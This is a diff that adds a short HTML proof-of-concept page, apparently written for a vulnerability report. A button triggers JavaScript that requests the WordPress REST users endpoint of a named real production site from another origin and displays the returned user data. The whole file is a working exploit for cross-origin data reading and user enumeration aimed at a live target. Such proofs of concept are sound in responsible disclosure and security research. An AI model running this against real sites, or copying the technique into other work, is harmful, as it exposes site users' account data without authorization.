@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<meta charset="UTF-8">
+<html><head>
+	<script>
+	function exploit() {    
+	var xmlhttp = new XMLHttpRequest();  
+	xmlhttp.onreadystatechange = function() { 
+		if (this.readyState == 4) {
+		var jsonString = this.responseText;
+		var jsonPretty = JSON.stringify(JSON.parse(jsonString),null,2);
+		alert(jsonPretty);
+        	};
+	};
+		xmlhttp.open("GET", "https://newsroom.spotify.com/?rest_route=/wp/v2/users/", true);
+		xmlhttp.send();
+	};
+	</script>
+</head><body>
+	<center>
+	<table cellpadding=200>
+	<tr>
+	<td>
+	<button onclick="exploit();">run proof of concept</button>
+	</td>
+	</tr>
+	</center>
+</body>
+</html>
